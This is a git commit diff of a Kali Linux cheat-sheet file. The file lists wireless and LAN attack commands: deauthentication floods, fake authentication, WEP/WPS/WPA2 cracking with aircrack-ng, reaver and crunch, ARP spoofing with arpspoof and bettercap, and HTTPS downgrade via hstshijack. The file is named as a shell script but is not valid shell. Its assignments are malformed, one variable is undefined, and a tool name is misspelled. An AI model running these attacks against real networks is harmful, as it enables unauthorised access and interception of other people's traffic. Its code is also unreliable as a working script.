c5849262f6735493c09d50119d248fd21b97d3ed
Antonio Garofalo <avorio.dev@gmail.com>
2022-09-19 11:56:04 +0200

    Update 00_kali_utils.sh

--- 00_kali_utils.sh
+++ 00_kali_utils.sh
@@ -1,93 +1,150 @@
-00 - Common tools usage
+"COMMON KALI COMMANDS"
 
-------------------------------------------------
-
--> Set QWERTY mapkeys
+"------------------------------------------------"
+"-> SET QWERTY MAPKEYS"
 setxkbmap -layout it
 
+"------------------------------------------------"
+"-> SET WIRELESS ADAPTER IN MONITOR MODE"
+interface = "wlan0"
 
--> Set your interface in monitor mode
 iwconfig
 airmon-ng check kill
-ifconfig <interface> down
-iwconfig <interface> mode monitor
-ifconfig <interface> up
+ifconfig $interface down
+iwconfig $interface mode monitor
+ifconfig $interface up
 
+"------------------------------------------------"
+"-> SET FAKE MAC ADDRESS ( new fake address must start with 00 )"
+interface = "wlan0"
 
--> Change MAC Address ( new fake address must start with 00 )
-ifconfig <interface> hw ether 00:11:22:33:44:55
+ifconfig $interface hw ether 00:11:22:33:44:55
 
+"------------------------------------------------"
+"-> START SNIFFING PACKETS"
+interface = "wlan0"
+MACNetwork = "00:11:22:33:44:55"
+channel   = 1
+filename  = "sniff"
 
--> Start sniffing packets
-airodump-ng <interface>
-airodump-ng --bssid <bssid> --channel <channel> --write <filename> <interface>
+airodump-ng $interface
+airodump-ng --bssid $MACNetwork --channel $channel --write $filename $interface
 
+"------------------------------------------------"
+"-> DEAUTHENTICATION ATTACK"
+interface  = "wlan0"
+MACNetwork = "00:11:22:33:44:55"
+MACStation = "00:11:22:33:44:55"
+packets	   = 1000000000
 
--> Deauthentication attack
-aireplay-ng --deauth 100000000 -a <bssid_network> -c <bssid_target> <interface>
-->for 5ghz
-aireplay-ng --deauth 100000000 -a <bssid_network> -c <bssid_target> -D <interface>
+"-> D for 5Ghz"
 
+aireplay-ng --deauth $packets -a $MACNetwork -c $MACStation [-D] $interface
 
--> Fake Auth attack
-aireplay-ng --fakeauth 0 -a <bssid_network> -h <bssid_target> <interface>
+"------------------------------------------------"
+"-> FAKE AUTHENTICATION ATTACK"
+interface  = "wlan0"
+MACNetwork = "00:11:22:33:44:55"
+MACStation = "00:11:22:33:44:55"
 
+aireplay-ng --fakeauth 0 -a $MACNetwork -h $MACTarget $interface
 
--> Crack WEP Network
-aireplay-ng --fakeauth 0 -a <bssid_network> -h <your_MAC> <interface>
-aireplay-ng --arpreplay -b <bssid_network> -h <your_MAC> <interface>
-aircrack-ng <file>.cap
+"------------------------------------------------"
+"-> CRACK WEP NETWORK"
+interface = "wlan0"
+MACNetwork = "00:11:22:33:44:55"
+channel   = 1
+filename  = "sniff.cap"
+myMAC	  = "00:11:22:33:44:55"
 
+airodump-ng $interface
+airodump-ng --bssid $MACNetwork --channel $channel --write $filename $interface
 
--> Check if WPS is enabled in network
-wash --interface <interface>
+aireplay-ng --fakeauth 0 -a $MACNetwork -h $myMAC $interface
+aireplay-ng --arpreplay -b $MACNetwork -h $myMAC $interface
+aircrack-ng $filename
 
+"------------------------------------------------"
+"-> SHOW NETWORK WITH WPS ENABLED"
+interface  = "wlan0"
 
--> Crack WPS network
-reaver --bssid <bssid_target> --channel <channel_target> --interface 
-<interface> --vvv --no-associate
+wash --interface $interface
 
+"------------------------------------------------"
+"-> CRACK WPS NETWORK"
+interface  = "wlan0"
+MACNetwork = "00:11:22:33:44:55"
+channel   = 1
 
--> Generate a wordlist
-crunch <min><max> <characters_set> [-t <pattern>] [-o <filename>]
+reaver --bssid $MACNetwork --channel $channel --interface $interface --vvv --no-associate
 
+"------------------------------------------------"
+"-> GENERATE A WORDLIST FILE"
+min      = 4
+max      = 8
+charSet  = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
+filename = "wordlist"
+pattern  = "A@@@Z"
 
-->Crack WPA2 network with wordlist in storage
--> aircarck-ng <file_handshake>.cap -w <wordlist>.txt
+"-> $pattern for pattern like A@@@Z"
 
+crunch $min $max $charSet [-t $pattern] -o $filename
 
-->Crack WPA2 network without wordlist in storage
--> crunch <min> <max> | aircrack-ng -w - -b <bssid_network> <file_handshake>.cap
+"------------------------------------------------"
+"-> CRACK WPA2 NETWORK WITH STORED WORDLIST FILE"
+handshake = "home/Desktop/handshake.cap"
+wordlist  = "home/Desktop/wordlist.txt"
 
+-> aircarck-ng $handshake -w $wordlist
 
-->Discover all devices connected to your network
-netdiscover -r <inet_ip>/24
+"------------------------------------------------"
+"-> CRACK WPA2 NETWORK WITH RUNTIME BUILT WORDLIST"
+min        = 4
+max        = 8
+charSet    = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
+MACNetwork = "00:11:22:33:44:55"
+handshake  = "home/Desktop/handshake.cap"
 
+crunch $min $max $charSet | aircrack-ng -w - -b $MACNetwork $handshake
 
--> ARP Spoofing 
+"------------------------------------------------"
+"-> DISCOVER ALL DEVICES CONNECTED TO YOUR NETWORK"
+gatewayIP = 192.168.1.1
+netdiscover -r $gatewayIP/24
+
+"------------------------------------------------"
+"-> DISCOVER INFORMATION ABOUT DEVICES CONNECTED TO YOUR NETWORK"
+zenmap-kbx
+
+"------------------------------------------------"
+"-> ARP SPOOFING"
+interface = "wlan0"
+gatewayIP = 192.168.1.1
+clientIP  = 192.168.1.155
+
 arp -a
-arpspoof -i <interface> -t <clientIP> <gatewayIP>
-arpspoof -i <interface> -t <gatewayIP> <clientIP>
+arpspoof -i $interface -t $clientIP $gatewayIP
+arpspoof -i $interface -t $gatewayIP $clientIP
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
+"------------------------------------------------"
+"-> ARP SPOOFING WITH BETTERCAP"
+interface  = "wlan0"
 
--> ARP Spoofing with bettercap
+bettercap -iface $interface
+caplets.update
+caplets.show
 
-bettercap -iface <interface>
 net.probe on
-
 set arp.spoof fullduplex true
 set arp.spoof fullduplex targets 192.168.1.2
-"Multiple target"
-"set arp.spoof fullduplex targets 192.168.1.2, 192.168.1.3, 192.168.1.4 ..."
+"-> Multiple target"
+"-> set arp.spoof fullduplex targets 192.168.1.2, 192.168.1.3, 192.168.1.4 ..."
 arp.spoof on
 
-"For downgrade HTTPS to HTTP"
+"-> For downgrade HTTPS to HTTP"
 set net.sniff.local true
 net.sniff on
 
-caplets.update
-caplets.show
 hstshijack/hstshijack
-
 
